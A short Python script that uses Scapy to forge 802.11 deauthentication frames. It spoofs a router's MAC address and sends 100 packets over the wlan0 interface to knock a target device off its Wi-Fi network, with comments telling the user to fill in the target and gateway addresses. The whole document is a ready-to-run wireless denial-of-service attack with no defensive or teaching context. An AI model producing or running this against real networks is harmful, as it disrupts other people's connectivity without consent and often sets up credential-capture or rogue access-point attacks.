from scapy.all import Dot11, RadioTap, Dot11Deauth, sendp

# Replace these with the MAC addresses of your target and gateway
target_mac = "FF:FF:FF:FF:FF:FF"  # Replace with the target device's MAC address
gateway_mac = "FF:FF:FF:FF:FF:FF"  # Replace with the desired router's MAC address

# 802.11 frame
# addr1: destination MAC (target device)
# addr2: source MAC (gateway/router)
# addr3: Access Point MAC (gateway/router)
dot11 = Dot11(addr1=target_mac, addr2=gateway_mac, addr3=gateway_mac)

# Stack up the frame with RadioTap and Dot11Deauth layers
packet = RadioTap() / dot11 / Dot11Deauth(reason=7)

# Send the de-authentication packet
# - inter: time interval between packets
# - count: number of packets to send
# - iface: network interface to use
# - verbose: level of verbosity (1 for more information)
sendp(packet, inter=0.1, count=100, iface="wlan0", verbose=1)
